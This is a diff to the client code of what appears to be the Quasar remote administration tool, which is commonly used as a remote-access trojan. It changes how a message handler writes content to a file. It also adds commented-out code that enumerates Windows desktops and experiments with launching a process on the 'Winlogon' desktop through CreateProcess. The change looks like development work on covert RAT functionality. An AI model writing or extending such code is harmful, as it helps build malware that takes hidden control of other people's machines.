@@ -2,10 +2,12 @@
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
@@ -44,10 +46,7 @@ namespace Quasar.Client.Messages
                 }
                 try
                 {
-                    using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
-                    {
-                        writer.Write(contentStr);
-                    }
+                    File.WriteAllText(text9, contentStr, System.Text.Encoding.Unicode);
                     // File.WriteAllText(text9, contentStr);
                 }
                 catch (Exception)
@@ -79,7 +78,21 @@ namespace Quasar.Client.Messages
                     NativeMethods.STARTUPINFO structure = default(NativeMethods.STARTUPINFO);
                     NativeMethods.PROCESS_INFORMATION process_INFORMATION = default(NativeMethods.PROCESS_INFORMATION);
                     structure.cb = (uint)Marshal.SizeOf<NativeMethods.STARTUPINFO>(structure);
-                    // structure.lpDesktop = client.currentDesktopString;                    
+                    List<string> desktopNames = new List<string>();
+
+                    // Enumerate through all desktops
+                    //NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
+                    //{
+                    //    desktopNames.Add(desktop);
+                    //    return true; // Continue enumeration
+                    //}, IntPtr.Zero);
+
+                    //foreach(var name in desktopNames)
+                    //{
+                    //    MessageBox.Show(name);
+                    //}
+
+                    //structure.lpDesktop = "Winlogon"; 
                     
                     if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\"", text10, text9, num), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                     {
